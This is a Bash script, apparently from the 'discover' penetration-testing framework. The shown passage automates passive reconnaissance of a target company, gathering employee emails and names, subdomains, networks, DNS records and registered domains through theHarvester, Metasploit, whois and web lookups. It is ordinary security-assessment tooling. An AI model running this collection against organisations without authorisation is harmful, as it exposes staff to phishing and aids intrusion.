#!/bin/bash
#
# by Lee Baird
# Contact me via chat or email with any feedback or suggestions that you may have:
# leebaird@gmail.com
#
# Special thanks to the following people:
#
# Jay Townsend - conversion from Backtrack to Kali, manages pull requests & issues
# Jason Ashton (@ninewires)- Penetration Testers Framework (PTF) compatibility, bug crusher
# Ian Norden (@iancnorden) - new report framework design
#
# Ben Wood (@DilithiumCore) - regex master
# Dave Klug - planning, testing and bug reports
# Jason Arnold (@jasonarnold) - planning original concept, author of ssl-check and co-author of crack-wifi
# John Kim - python guru, bug smasher, and parsers
# Eric Milam (@Brav0Hax) - total re-write using functions
# Martin Bos (@cantcomputer) - IDS evasion techniques
# Matt Banick - original development
# Numerous people on freenode IRC - #bash and #sed (e36freak)
# Rob Dixon (@304geek) - report framework idea
# Robert Clowser (@dyslexicjedi)- all things
# Saviour Emmanuel - Nmap parser
# Securicon, LLC. - for sponsoring development of parsers
# Steve Copland - initial report framework design

##############################################################################################################

# Catch process termination
trap f_terminate SIGHUP SIGINT SIGTERM

# Global variables
distro=$(uname -n)
home=$HOME
long='=============================================================================================================='
medium='=================================================================='
short='========================================'

sip='sort -n -u -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4'

# Check for OS X
if [[ `uname` == 'Darwin' ]]; then
     browser=Safari
     discover=$(locate discover.sh | sed 's:/[^/]*$::')
     ip=$(ifconfig | grep 'en0' -A2 | grep 'inet' | cut -d ' ' -f2)
     interface=en0
     msf=/opt/metasploit-framework/bin/msfconsole
     msfv=/opt/metasploit-framework/bin/msfvenom
     port=4444
     web="open -a Safari"
else
     browser=Firefox
     discover=$(updatedb; locate discover.sh | sed 's:/[^/]*$::')
     ip=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}')
     interface=$(ip link | awk '{print $2, $9}' | grep 'UP' | cut -d ':' -f1)
     msf=msfconsole
     msfv=msfvenom
     port=443
     web="firefox -new-tab"
fi

##############################################################################################################

f_banner(){
echo
echo -e "\x1B[1;33m
______  ___ ______ ______  _____  _    _ ______  _____
|     \  |  |____  |      |     |  \  /  |_____ |____/
|_____/ _|_ _____| |_____ |_____|   \/   |_____ |    \_

By Lee Baird\x1B[0m"
echo
echo
}

##############################################################################################################

f_error(){
echo
echo -e "\x1B[1;31m$medium\x1B[0m"
echo
echo -e "\x1B[1;31m           *** Invalid choice or entry. ***\x1B[0m"
echo
echo -e "\x1B[1;31m$medium\x1B[0m"
sleep 2
f_main
}

f_errorOSX(){
if [[ `uname` == 'Darwin' ]]; then
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     echo
     echo -e "\x1B[1;31m             *** Not OS X compatible. ***\x1B[0m"
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     sleep 2
     f_main
fi
}

##############################################################################################################

f_location(){
echo
echo -n "Enter the location of your file: "
read -e location

# Check for no answer
if [[ -z $location ]]; then
     f_error
fi

# Check for wrong answer
if [ ! -f $location ]; then
     f_error
fi
}

##############################################################################################################

f_runlocally(){
if [[ -z $DISPLAY ]]; then
     clear
     f_banner
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     echo
     echo -e "\x1B[1;31m *** This option must be run locally, in an X-Windows environment. ***\x1B[0m"
     echo
     echo -e "\x1B[1;31m$medium\x1B[0m"
     sleep 4
     f_main
fi
}

##############################################################################################################

f_terminate(){

save_dir=$home/data/cancelled-`date +%H:%M:%S`
echo "Terminating..."
echo "All data will be saved in $save_dir"
mkdir $save_dir

# Nmap and Metasploit scans
mv $name/ $save_dir 2>/dev/null

# Recon files
mv debug* curl emails* hosts names* networks* records squatting network-tools whois* sub* doc pdf ppt txt xls tmp* z* $save_dir 2>/dev/null
cd /tmp/
rm emails names networks profiles subdomains 2>/dev/null

echo "Saving complete"
exit
}

##############################################################################################################

f_domain(){
clear
f_banner
echo -e "\x1B[1;34mRECON\x1B[0m"
echo
echo "1.  Passive"
echo "2.  Active"
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     clear
     f_banner

     echo -e "\x1B[1;34mUses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester,\x1B[0m"
     echo -e "\x1B[1;34m Metasploit, URLCrazy, Whois, multiple websites, and recon-ng.\x1B[0m"
     echo
     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub,\x1B[0m"
     echo -e "\x1B[1;34m Google, Hashes, and Shodan for maximum results with recon-ng.\x1B[0m"
     echo
     echo $medium
     echo
     echo "Usage"
     echo
     echo "Company: Target"
     echo "Domain:  target.com"
     echo
     echo $medium
     echo
     echo -n "Company: "
     read company

     # Check for no answer
     if [[ -z $company ]]; then
          f_error
     fi

     echo -n "Domain:  "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     # If folder doesn't exist, create it
     if [ ! -d $home/data/$domain ]; then
          cp -R $discover/report/ $home/data/$domain
          sed 's/REPLACEDOMAIN/'$domain'/g' $home/data/$domain/index.htm > tmp
          mv tmp $home/data/$domain/index.htm
     fi

     # Number of tests
     total=34

     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )

     echo
     echo $medium
     echo
     echo "ARIN"
     echo "     Email                (1/$total)"
     wget -q https://whois.arin.net/rest/pocs\;domain=$domain -O tmp.xml

     # Remove all empty files
     find -type f -empty -exec rm {} +

     if [ -e tmp.xml ]; then
          xmllint --format tmp.xml | grep 'handle' | cut -d '>' -f2 | cut -d '<' -f1 | sort -u > zurls.txt
          xmllint --format tmp.xml | grep 'handle' | cut -d '"' -f2 | sort -u > zhandles.txt

          while read x; do
               wget -q $x -O tmp2.xml
               xml_grep 'email' tmp2.xml --text_only >> zarin-emails
          done < zurls.txt
     fi

     echo "     Names                (2/$total)"
     if [ -e zhandles.txt ]; then
          while read y; do
               curl --silent https://whois.arin.net/rest/poc/$y.txt | grep 'Name' >> tmp
          done < zhandles.txt

          grep -v '@' tmp | sed 's/Name:           //g' | tr '[A-Z]' '[a-z]' | sed 's/\b\(.\)/\u\1/g' | sort -u > zarin-names
     fi

     rm zurls.txt zhandles.txt 2>/dev/null

     echo "     Networks             (3/$total)"

     wget -q https://whois.arin.net/rest/orgs\;name=$companyurl -O tmp.xml

     if [ -s tmp.xml ]; then
          xmllint --format tmp.xml | grep 'handle' | cut -d '/' -f6 | cut -d '<' -f1 | sort -uV > tmp

          while read handle; do
               echo "          " $handle
               curl --silent https://whois.arin.net/rest/org/$handle/nets.txt | head -1 > tmp2
               if grep 'DOCTYPE' tmp2 > /dev/null; then
                    echo > /dev/null
               else
                    awk '{print $4 "-" $6}' tmp2 >> tmp3
               fi
          done < tmp
     fi

     $sip tmp3 > networks-tmp 2>/dev/null
     echo

     echo "dnsrecon                  (4/$total)"
     dnsrecon -d $domain -t goo > tmp
     grep $domain tmp | egrep -v '(Performing|Records Found)' | awk '{print $3 " " $4}' | awk '$2 !~ /[a-z]/' | column -t | sort -u > sub1
     echo

     echo "goofile                   (5/$total)"
     goofile -d $domain -f doc > tmp
     goofile -d $domain -f docx >> tmp
     goofile -d $domain -f pdf >> tmp
     goofile -d $domain -f ppt >> tmp
     goofile -d $domain -f pptx >> tmp
     goofile -d $domain -f txt >> tmp
     goofile -d $domain -f xls >> tmp
     goofile -d $domain -f xlsx >> tmp

     grep $domain tmp | grep -v 'Searching in' | grep -Fv '...' | sort > tmp2

     grep '.doc' tmp2 | egrep -v '(.pdf|.ppt|.xls)' > doc
     grep '.pdf' tmp2 > pdf
     grep '.ppt' tmp2 > ppt
     grep '.txt' tmp2 | grep -v 'robots.txt' > txt
     grep '.xls' tmp2 > xls
     echo

     echo "goog-mail                 (6/$total)"
     $discover/mods/goog-mail.py $domain > zgoog-mail
     echo

     echo "goohost"
     echo "     IP                   (7/$total)"
     $discover/mods/goohost.sh -t $domain -m ip >/dev/null
     echo "     Email                (8/$total)"
     $discover/mods/goohost.sh -t $domain -m mail >/dev/null
     cat report-* > tmp
     # Move the second column to the first position
     grep $domain tmp | awk '{print $2 " " $1}' > tmp2
     column -t tmp2 > zgoohost
     rm *-$domain.txt
     echo

     echo "theHarvester"
     
     # Use local python interpreter according to PATH.
     pyint="/usr/bin/env python"
     
     # PTF
     if [ -f /pentest/intelligence-gathering/theharvester/theHarvester.py ]; then
          theharvester="theHarvester"
     else
          theharvester="/usr/share/theharvester/theHarvester.py"
     fi

     echo "     Baidu                (9/$total)"
     $pyint $theharvester -d $domain -b baidu > zbaidu
     echo "     Bing                 (10/$total)"
     $pyint $theharvester -d $domain -b bing > zbing
     echo "     Dogpilesearch        (11/$total)"
     $pyint $theharvester -d $domain -b dogpilesearch > zdogpilesearch
     echo "     Google               (12/$total)"
     $pyint $theharvester -d $domain -b google > zgoogle
     echo "     Google CSE           (13/$total)"
     $pyint $theharvester -d $domain -b googleCSE > zgoogleCSE
     echo "     Google+              (14/$total)"
     $pyint $theharvester -d $domain -b googleplus | sed 's/ - Google+//g' > zgoogleplus
     echo "     Google Profiles	  (15/$total)"
     $pyint $theharvester -d $domain -b google-profiles > zgoogle-profiles
     echo "     Jigsaw               (16/$total)"
     $pyint $theharvester -d $domain -b jigsaw > zjigsaw
     echo "     LinkedIn             (17/$total)"
     $pyint $theharvester -d $domain -b linkedin > zlinkedin
     echo "     PGP                  (18/$total)"
     $pyint $theharvester -d $domain -b pgp > zpgp
     echo "     Yahoo                (19/$total)"
     $pyint $theharvester -d $domain -b yahoo > zyahoo
     echo "     All                  (20/$total)"
     $pyint $theharvester -d $domain -b all > zall
     echo

     echo "Metasploit                (21/$total)"
     msfconsole -x "use auxiliary/gather/search_email_collector; set DOMAIN $domain; run; exit y" > tmp 2>/dev/null
     grep @$domain tmp | awk '{print $2}' | grep -v '%' | grep -Fv '...@' > zmsf
     echo

     echo "URLCrazy                  (22/$total)"
     urlcrazy $domain > tmp
     # Clean up & Remove Blank Lines
     egrep -v '(#|:|\?|\-|RESERVED|URLCrazy)' tmp | sed '/^$/d' > tmp2
     # Realign Columns
     sed -e 's/..,/   /g' tmp2 > tmp3
     # Convert Caps
     sed 's/AUSTRALIA/Australia/g; s/AUSTRIA/Austria/g; s/BAHAMAS/Bahamas/g; s/BANGLADESH/Bangladesh/g; s/BELGIUM/Belgium/g; s/BULGARIA/Bulgaria/g; s/CANADA/Canada/g; s/CAYMAN ISLANDS/Cayman Islands/g; s/CHILE/Chile/g; s/CHINA/China/g; s/COSTA RICA/Costa Rica/g; s/CZECH REPUBLIC/Czech Republic/g; s/DENMARK/Denmark/g; s/EUROPEAN UNION/European Union/g; s/FINLAND/Finland/g; s/FRANCE/France/g; s/GERMANY/Germany/g; s/HONG KONG/Hong Kong/g; s/HUNGARY/Hungary/g; s/INDIA/India/g; s/INDONESIA/Indonesia/g; s/IRELAND/Ireland/g; s/ISRAEL/Israel/g; s/ITALY/Italy/g; s/JAPAN/Japan/g; s/KOREA REPUBLIC OF/Republic of Korea/g; s/LUXEMBOURG/Luxembourg/g; s/NETHERLANDS/Netherlands/g; s/NORWAY/Norway/g; s/POLAND/Poland/g; s/RUSSIAN FEDERATION/Russia            /g; s/SAUDI ARABIA/Saudi Arabia/g; s/SPAIN/Spain/g; s/SWEDEN/Sweden/g; s/SWITZERLAND/Switzerland/g; s/TAIWAN REPUBLIC OF China (ROC)/Taiwan                        /g; s/THAILAND/Thailand/g; s/TURKEY/Turkey/g; s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United States/g; s/VIRGIN ISLANDS (BRITISH)/Virgin Islands          /g; s/ROMANIA/Romania/g; s/SLOVAKIA/Slovakia/g' tmp3 > squatting

     ##############################################################

     cat z* > tmp
     # Remove lines that contain a number
     sed '/[0-9]/d' tmp > tmp2
     # Remove lines that start with @
     sed '/^@/ d' tmp2 > tmp3
     # Remove lines that start with .
     sed '/^\./ d' tmp3 > tmp4
     # Change to lower case
     cat tmp4 | tr '[A-Z]' '[a-z]' > tmp5
     # Remove blank lines
     sed '/^$/d' tmp5 > tmp6
     # Remove lines that contain a single word
     sed '/[[:blank:]]/!d' tmp6 > tmp7
     # Clean up
     egrep -v '(\*|\[|:|found|full|network)' tmp7 | sort -u > names1

     ##############################################################

     cat z* | sed '/^[0-9]/!d' | grep -v '@' > tmp
     # Substitute a space for a colon
     sed 's/:/ /g' tmp > tmp2
     # Move the second column to the first position
     awk '{ print $2 " " $1 }' tmp2 > tmp3
     column -t tmp3 > tmp4
     # Change to lower case
     cat tmp4 | tr '[A-Z]' '[a-z]' > tmp5
     sed 's/<strong>//g; s/<//g' tmp5 | grep $domain | column -t | sort -u > sub2
     echo

     ##############################################################

     echo "Whois"
     echo "     Domain               (23/$total)"
     whois -H $domain > tmp 2>/dev/null
     # Remove leading whitespace
     sed 's/^[ \t]*//' tmp > tmp2
     # Clean up
     egrep -v '(#|%|<a|=-=-=-=|Access may be|Additionally|Afilias except|and DNS Hosting|and limitations of|any use of|Be sure to|By submitting an|by the terms|can easily change|circumstances will|clientDeleteProhibited|clientTransferProhibited|clientUpdateProhibited|company may be|complaint will|contact information|Contact us|Copy and paste|currently set|database|data contained in|data presented in|date of|dissemination|Domaininfo AB|Domain Management|Domain names in|Domain status: ok|enable high|except as reasonably|failure to|facsimile of|for commercial purpose|for detailed information|For information for|for information purposes|for the sole|Get Noticed|Get a FREE|guarantee its|HREF|In Europe|In most cases|in obtaining|in the address|includes restrictions|including spam|information is provided|is not the|is providing|Learn how|Learn more|makes this information|MarkMonitor|mining this data|minute and one|modify existing|modify these terms|must be sent|name cannot|NamesBeyond|not to use|Note: This|NOTICE|obtaining information about|of Moniker|of this data|or hiding any|or otherwise support|other use of|own existing customers|Please be advised|Please note|policy|prior written consent|privacy is|Problem Reporting System|Professional and|prohibited without|Promote your|protect the|Public Interest|queries or|Register your|Registrars|registration record|repackaging,|responsible for|See Business Registration|server at|solicitations via|sponsorship|Status|support questions|support the transmission|telephone, or facsimile|that apply to|that you will|the right| The data is|The fact that|the transmission|The Trusted Partner|This listing is|This feature is|This information|This service is|to collect or|to entities|to report any|transmission of mass|UNITED STATES|United States|unsolicited advertising|Users may|Version 6|via e-mail|Visit AboutUs.org|while believed|will use this|with many different|with no guarantee|We reserve the|Whois|you agree|You may not)' tmp2 > tmp3
     # Remove lines starting with "*"
     sed '/^*/d' tmp3 > tmp4
     # Remove lines starting with "-"
     sed '/^-/d' tmp4 > tmp5
     # Remove lines starting with http
     sed '/^http/d' tmp5 > tmp6
     # Remove lines starting with US
     sed '/^US/d' tmp6 > tmp7
     # Clean up phone numbers
     sed 's/+1.//g' tmp7 > tmp8
     # Remove leading whitespace from file
     awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp8 > tmp9
     # Remove trailing whitespace from each line
     sed 's/[ \t]*$//' tmp9 > tmp10
     # Compress blank lines
     cat -s tmp10 > tmp11
     # Remove lines that end with various words then a colon or period(s)
     egrep -v '(2:$|3:$|Address.$|Address........$|Address.........$|Ext.:$|FAX:$|Fax............$|Fax.............$|Province:$|Server:$)' tmp11 > tmp12
     # Remove line after "Domain Servers:"
     sed -i '/^Domain Servers:/{n; /.*/d}' tmp12
     # Remove line after "Domain servers"
     sed -i '/^Domain servers/{n; /.*/d}' tmp12
     # Remove blank lines from end of file
     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp12 > tmp13

     while IFS=$': \t' read -r first rest; do
          if [[ $first$rest ]]; then
               printf '%-20s %s\n' "$first:" "$rest"
          else
               echo
          fi
     done < tmp13 > whois-domain

     echo "     IP 		  (24/$total)"
     wget -q http://network-tools.com/default.asp?prog=network\&host=$domain -O network-tools
     y=$(cat network-tools | grep 'Registered Domain' | awk '{print $1}')

     if ! [ "$y" = "" ]; then
          whois -H $y > tmp
          # Remove leading whitespace
          sed 's/^[ \t]*//' tmp > tmp2
          # Remove trailing whitespace from each line
          sed 's/[ \t]*$//' tmp2 > tmp3
          # Clean up
          egrep -v '(\#|\%|\*|All reports|Comment|dynamic hosting|For fastest|For more|Found a referral|http|OriginAS:$|Parent:$|point in|RegDate:$|remarks:|The activity|the correct|this kind of object|Without these)' tmp3 > tmp4
          # Remove leading whitespace from file
          awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp4 > tmp5
          # Remove blank lines from end of file
          awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
          # Compress blank lines
          cat -s tmp6 > tmp7
          # Clean up
          sed 's/+1-//g' tmp7 > tmp8
          while IFS=$': \t' read -r first rest; do
               if [[ $first$rest ]]; then
                    printf '%-20s %s\n' "$first:" "$rest"
               else
                    echo
               fi
          done < tmp8 > whois-ip
          echo

          # Remove all empty files
          find -type f -empty -exec rm {} +
     else
          echo > whois-ip
     fi

     echo "dnsdumpster.com           (25/$total)"
     wget -q https://dnsdumpster.com/static/map/$domain.png -O $home/data/$domain/images/dnsdumpster.png

     # Generate a random cookie value
     rando=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

     curl --silent --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$rando&targetip=$domain" --cookie "csrftoken=$rando; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com > tmp

     dumpsterxls=$(grep 'xls' tmp | tr '"' ' ' | cut -d ' ' -f10)
     if ! [ -z $dnsdumpster ]; then
          wget -q $dumpsterxls -O tmp.xlsx

          ssconvert -E Gnumeric_Excel:xlsx -T Gnumeric_stf:stf_csv tmp.xlsx tmp.csv 2>/dev/null
          cat tmp.csv | sed 's/,"//g' | egrep -v '(Hostname|MX|NS)' | cut -d ',' -f1-2 | grep -v '"' | sed 's/,/ /g' | sort -u | column -t > sub-dnsdumpster
     fi

     echo "dnswatch.info             (26/$total)"
     echo '*' > tmp
     echo '%' >> tmp

     # A record
     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=A\&submit=Resolve -O tmp2
     grep 'A record found' tmp2 | sed 's/">/ /g' | sed 's/<\// /g' | awk '{print $6","$1","" "}' >> tmp

     # NS records
     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=NS\&submit=Resolve -O tmp2
     grep 'NS record found' tmp2 | sed 's/\.</>/g' | cut -d '>' -f2 > tmp3
     while read i; do wget -q http://network-tools.com/default.asp?prog=network\&host=$i -O network-tools; grep 'Registered Domain' network-tools | awk '{print $1",""NS"","host}' host="$i" >> tmp; done < tmp3

     # MX Records
     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=MX\&submit=Resolve -O tmp2
     grep 'MX record found' tmp2 | sed 's/\.</ /g' | cut -d ' ' -f6 > tmp3
     while read i; do wget -q http://network-tools.com/default.asp?prog=network\&host=$i -O network-tools; grep 'Registered Domain' network-tools | awk '{print $1",""MX"","host}' host="$i" >> tmp; done < tmp3

     # SOA records
     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=SOA\&submit=Resolve -O tmp2
     grep 'SOA record found' tmp2 | sed 's/>/ /g' | sed 's/\. / /g' | cut -d ' ' -f6 > tmp3
     grep 'SOA record found' tmp2 | sed 's/>/ /g' | sed 's/\. / /g' | cut -d ' ' -f7 >> tmp3
     while read i; do wget -q http://network-tools.com/default.asp?prog=network\&host=$i -O network-tools; grep 'Registered Domain' network-tools | awk '{print $1",""SOA"","host}' host="$i" >> tmp; done < tmp3

     # TXT records
     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=TXT\&submit=Resolve -O tmp2
     grep 'TXT record found' tmp2 | sed 's/>&quot;/%/g' | sed 's/&quot;</%/g' | sed 's/TXT/%TXT%/g' | awk -F'%' '{print " "","$2","$4}' >> tmp

     # Formatting & clean-up
     column -s ',' -t tmp > tmp4

     egrep -v '(\*|%)' tmp4 >> $home/data/$domain/data/records.htm
     echo >> $home/data/$domain/data/records.htm
     echo '</body>' >> $home/data/$domain/data/records.htm
     echo >> $home/data/$domain/data/records.htm
     echo '</html>' >> $home/data/$domain/data/records.htm

     echo "email-format.com          (27/$total)"
     curl --silent http://www.email-format.com/d/$domain/ | grep -o [A-Za-z0-9_.]*@[A-Za-z0-9_.]*[.][A-Za-z]* > zemail-format

     echo "ewhois.com                (28/$total)"
     wget -q http://www.ewhois.com/$domain/ -O tmp
     cat tmp | grep 'visitors' | cut -d '(' -f1 | cut -d '>' -f2 | grep -v 'OTHER' | column -t | sort -u > sub3

     echo "intodns.com               (29/$total)"
     wget -q http://www.intodns.com/$domain -O tmp
     cat tmp | sed '1,32d' | sed 's/<table width="99%" cellspacing="1" class="tabular">/<center><table width="85%" cellspacing="1" class="tabular"><\/center>/g' | sed 's/Test name/Test/g' | sed 's/ <a href="feedback\/?KeepThis=true&amp;TB_iframe=true&amp;height=300&amp;width=240" title="intoDNS feedback" class="thickbox feedback">send feedback<\/a>//g' | egrep -v '(Processed in|UA-2900375-1|urchinTracker|script|Work in progress)' | sed '/footer/I,+3 d' | sed '/google-analytics/I,+5 d' > tmp2
     cat tmp2 >> $home/data/$domain/pages/config.htm

     echo "myipneighbors.net         (30/$total)"
     wget -q http://www.myipneighbors.net/?s=$domain -O tmp
     grep 'Domains' tmp | sed 's/<\/tr>/\\\n/g' | cut -d '=' -f3,6 | sed 's/" rel=/ /g' | sed 's/" rel//g' | grep -v '/' | column -t | sort -u > sub4

     echo "netcraft.com              (31/$total)"
     wget -q http://toolbar.netcraft.com/site_report?url=http://www.$domain -O tmp

     # Remove lines from FOO to the second BAR
     awk '/DOCTYPE/{f=1} (!f || f>2){print} (f && /\/form/){f++}' tmp > tmp2

     egrep -v '(Background|Hosting country|the-world-factbook)' tmp2 | sed 's/Refresh//g' > tmp3

     # Find lines that contain FOO, and delete to the end of file
     sed '/security_table/,${D}' tmp3 | sed 's/<h2>/<h4>/g' | sed 's/<\/h2>/<\/h4>/g' > tmp4

     # Compress blank lines
     sed /^$/d tmp4 >> $home/data/$domain/pages/netcraft.htm
     echo >> $home/data/$domain/pages/netcraft.htm
     echo '</body>' >> $home/data/$domain/pages/netcraft.htm
     echo >> $home/data/$domain/pages/netcraft.htm
     echo '</html>' >> $home/data/$domain/pages/netcraft.htm

     echo "ultratools.com            (32/$total)"
     x=0

     f_passive_axfr(){
          sed -e 's/<[^>]*>//g' curl > tmp
          grep -A4 "\<.*$domain\>" tmp | sed 's/--//g' | sed 's/\.$//g' | sed 's/^ *//g' | sed '/^$/d' > tmp2
          cat tmp2 | paste - - - - - -d, | column -s ',' -t > tmp3
          sort -u tmp3 >> $home/data/$domain/data/zonetransfer.htm
          echo >> $home/data/$domain/data/zonetransfer.htm
     }

     while [ $x -le 10 ]; do
          curl -k --silent https://www.ultratools.com/tools/zoneFileDumpResult?zoneName=$domain > curl
          q=$(grep "$domain" curl | wc -l)

          if [ $q -gt 1 ]; then
               f_passive_axfr
               break
          else
               x=$(( $x + 1 ))
               sleep 2
          fi
     done

     if [ $x -eq 11 ]; then
          echo 'Zone transfer failed.' >> $home/data/$domain/data/zonetransfer.htm
     fi

     echo >> $home/data/$domain/data/zonetransfer.htm
     echo '</body>' >> $home/data/$domain/data/zonetransfer.htm
     echo '</html>' >> $home/data/$domain/data/zonetransfer.htm

     echo "Domains                   (33/$total)"
     f_regdomain(){
     while read regdomain; do
          whois -H $regdomain 2>&1 | sed -e 's|^[ \t]*||' | sed 's| \+ ||g' | sed 's|: |:|g' > tmp5
          nomatch=$(grep -c -E 'No match for|Name or service not known' tmp5)

          if [[ $nomatch -eq 1 ]]; then
               echo "$regdomain -- No Whois Matches Found" >> tmp4
          else
               registrar=$(grep -m1 'Registrar:' tmp5 | cut -d ':' -f2 | sed 's|,||g')
               regorg=$(grep -m1 'Registrant Organization:' tmp5 | cut -d ':' -f2 | sed 's|,||g')
               regemail=$(grep -m1 'Registrant Email:' tmp5 | cut -d ':' -f2)
               iptmp=$(ping -c1 $regdomain 2>&1)

               if echo $iptmp | grep -q 'unknown host'; then
                    echo "$regdomain,$registrar,$regorg,$regemail,No IP Found" >> tmp4
               else
                    ipaddr=$(echo $iptmp | grep 'PING' | cut -d '(' -f2 | cut -d ')' -f1)
                    echo "$regdomain,$registrar,$regorg,$regemail,$ipaddr" >> tmp4
               fi
          fi
          let number=number+1
          echo -ne "     \x1B[1;33m$number \x1B[0mof \x1B[1;33m$domcount \x1B[0mdomains"\\r
          sleep 2
     done < tmp3
     }

     # Get domains registered by company name and email address domain
     curl --silent http://viewdns.info/reversewhois/?q=%40$domain > tmp
     sleep 2
     curl --silent http://viewdns.info/reversewhois/?q=$companyurl > tmp2

     echo '111AAA--placeholder--' > tmp4
     if grep -q 'There are 0 domains' tmp && grep -q 'There are 0 domains' tmp2; then
          rm tmp tmp2
          echo 'No Domains Found.' > tmp6
          break
     elif ! [ -s tmp ] && ! [ -s tmp2 ]; then
          rm tmp tmp2
          echo 'No Domains Found.' > tmp6
          break
     
     # Loop thru list of domains, gathering details about the domain
     elif grep -q 'paymenthash' tmp; then
          grep 'Domain Name' tmp | sed 's|<tr>|\n|g' | grep '</td></tr>' | cut -d '>' -f2 | cut -d '<' -f1 > tmp3
          grep 'Domain Name' tmp2 | sed 's|<tr>|\n|g' | grep '</td></tr>' | cut -d '>' -f2 | cut -d '<' -f1 >> tmp3
          sort -uV tmp3 -o tmp3
          domcount=$(wc -l tmp3 | sed -e 's|^[ \t]*||' | cut -d ' ' -f1)
          f_regdomain
     else
          grep 'ViewDNS.info' tmp | sed 's|<tr>|\n|g' | grep '</td></tr>' | grep -v -E 'font size|Domain Name' | cut -d '>' -f2 | cut -d '<' -f1 > tmp3
          grep 'ViewDNS.info' tmp2 | sed 's|<tr>|\n|g' | grep '</td></tr>' | grep -v -E 'font size|Domain Name' | cut -d '>' -f2 | cut -d '<' -f1 >> tmp3
          sort -uV tmp3 -o tmp3
          domcount=$(wc -l tmp3 | sed -e 's|^[ \t]*||' | cut -d ' ' -f1)
          f_regdomain
     fi

     # Formatting & clean-up
     sort tmp4 | sed 's|111AAA--placeholder--|Domain,Registrar,Registration Org,Registration Email,IP Address|' > tmp6
     column -s ',' -t tmp6 > domains
     echo "Domains registered to $company & with email domain $domain" >> $home/data/$domain/data/domains.htm
     echo >> $home/data/$domain/data/domains.htm
     echo

     ##############################################################

     cat z* | grep "@$domain" | grep -vF '...' | grep -Fv '..' | egrep -v '(%|\*|-|=|\+|\[|\]|\||;|:|"|<|>|/|\?|,,|alphabetagency|anotherfed|definetlynot|edsnowden|edward.snowden|edward_snowden|esnowden|fake|fuckthepolice|jesus.juice|lastname_firstname|regulations|salessalesandmarketing|superspy|toastmasters|www|x.y|xxxxx|yousuck|zxcvbcvxvxcccb)' > tmp
     # Remove trailing whitespace from each line
     sed 's/[ \t]*$//' tmp > tmp2
     # Remove lines that start with a number
     sed '/^[0-9]/d' tmp2 > tmp3
     # Remove lines that start with @
     sed '/^@/ d' tmp3 > tmp4
     # Remove lines that start with .
     sed '/^\./ d' tmp4 > tmp5
     # Remove lines that start with _
     sed '/^\_/ d' tmp5 > tmp6
     # Change to lower case
     cat tmp6 | grep -v "'" | tr '[A-Z]' '[a-z]' | sort -u > emails

     ##############################################################

     # Remove lines that contain a number
     sed '/[0-9]/d' names1 > tmp2
     # Remove lines that start with @
     sed '/^@/ d' tmp2 > tmp3
     # Remove lines that start with .
     sed '/^\./ d' tmp3 > tmp4
     # Change to lower case
     cat tmp4 | tr '[A-Z]' '[a-z]' > tmp5
     # Remove blank lines
     sed '/^$/d' tmp5 > tmp6
     # Remove lines that contain a single word
     sed '/[[:blank:]]/!d' tmp6 > tmp7
     # Clean up
     egrep -v '(~|`|!|@|#|\$|%|\^|&|\*|\(|\)|_|-|\+|=|{|\[|}|]|\|:|;|"|<|>|\.|\?|/|abuse|academy|account|achievement|acquisition|acting|action|active|adjuster|admin|advanced|adventure|advertising|agency|alliance|allstate|ambassador|america|american|analysis|analyst|analytics|animal|another|antivirus|apple seems|application|applications|architect|archivist|article|assembler|assembling|assembly|asian|assignment|assistant|associate|association|attorney|audience|audio|auditor|australia|authority|automation|automotive|aviation|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|builder|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|centre|certified|cfi|challenger|championship|change|chapter|charge|chemistry|china|chinese|claim|class|clearance|cloud|cnc|code|cognitive|college|columbia|coming|commercial|communications|community|company pages|competition|competitive|compliance|computer|comsec|concept|conference|config|connections|connect|construction|consultant|contact|contract|contributor|control|cooperation|coordinator|corporate|corporation|counsel|create|creative|critical|crm|croatia|cryptologic|custodian|cyber|dallas|database|day care|dba|dc|death toll|delivery|delta|department|deputy|description|designer|design|destructive|detection|develop|devine|dialysis|digital|diploma|direct|disability|disaster|disclosure|dispatch|dispute|distribut|divinity|division|dns|document|dos poc|download|driver|during|economy|ecovillage|editor|education|effect|electronic|else|email|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expectations|expertzone|exploit|facebook|facilit|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|fellow|filmmaker|finance|financial|fitter|forensic|forklift|found|freelance|from|frontiers in tax|fulfillment|full|function|future|fuzzing|germany|get control|global|gnoc|google|governance|government|graphic|greater|group|guard|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|hostmaster|house|how to|hurricane|icmp|idc|in the 